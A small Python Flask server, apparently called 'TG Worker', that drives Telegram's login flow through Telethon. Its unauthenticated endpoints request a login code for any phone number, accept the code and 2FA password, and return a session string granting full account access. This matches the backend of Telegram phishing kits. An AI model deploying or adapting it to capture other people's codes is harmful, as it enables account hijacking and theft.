# TG Worker FIXED - replace your app.py with THIS
# pip install telethon flask flask-cors gunicorn

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberInvalidError
from flask import Flask, request, jsonify
import asyncio, os

app = Flask(__name__)
API_ID = int(os.getenv("API_ID","0") or 0)
API_HASH = os.getenv("API_HASH","")
sessions = {}

def run(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.get_json(force=True) or {}
    phone = (data.get("phone") or "").strip()
    api_id = int(data.get("api_id") or API_ID)
    api_hash = data.get("api_hash") or API_HASH
    if not api_id or not api_hash:
        return jsonify({"ok":False,"error":"API_ID/HASH not set on server"} )
    async def _send():
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        res = await client.send_code_request(phone)
        sessions[phone] = res.phone_code_hash
        await client.disconnect()
        return res.phone_code_hash
    try:
        h = run(_send())
        return jsonify({"ok":True, "phone_code_hash":h})
    except PhoneNumberInvalidError:
        return jsonify({"ok":False,"error":"Invalid phone number"})
    except Exception as e:
        return jsonify({"ok":False,"error":f"send_code failed: {e}"})

@app.route("/verify", methods=["POST"])
def verify():
    data = request.get_json(force=True) or {}
    phone = (data.get("phone") or "").strip()
    code = (data.get("code") or "").strip().replace(" ","").replace("-","")
    password = data.get("password")
    pch = data.get("phone_code_hash") or sessions.get(phone) or ""
    api_id = int(data.get("api_id") or API_ID)
    api_hash = data.get("api_hash") or API_HASH
    async def _verify():
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=pch)
        except SessionPasswordNeededError:
            if not password:
                await client.disconnect()
                return {"need_2fa":True}
            await client.sign_in(password=password)
        sess = client.session.save()
        me = await client.get_me()
        await client.disconnect()
        return {"ok":True, "session":sess, "user_id":me.id, "username":getattr(me,"username","")}
    try:
        r = run(_verify())
        if r.get("need_2fa"):
            return jsonify({"ok":False,"need_2fa":True})
        return jsonify(r)
    except PhoneCodeInvalidError:
        return jsonify({"ok":False,"error":"Invalid OTP - check code"})
    except PhoneCodeExpiredError:
        return jsonify({"ok":False,"error":"OTP expired - request new OTP"})
    except Exception as e:
        return jsonify({"ok":False,"error":str(e)})

@app.route("/")
def home():
    return "TG Worker OK - FIXED"
if __name__=="__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT",8080)))
